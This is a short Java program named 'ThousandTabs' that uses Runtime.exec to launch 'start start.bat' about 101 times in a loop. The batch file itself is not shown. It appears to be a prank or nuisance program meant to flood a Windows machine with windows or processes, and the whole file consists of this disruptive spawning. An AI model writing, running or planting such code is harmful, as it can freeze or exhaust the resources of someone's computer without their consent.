
public class ThousandTabs 
{
	public static void main(String args[])
	{
		try
		{
			Runtime.getRuntime().exec("start start.bat");
			
			for (int i = 0;i <100;++i)
			Runtime.getRuntime().exec("start start.bat");
		}
		catch (Exception e)
		{
			e.printStackTrace();
		}
	}
}
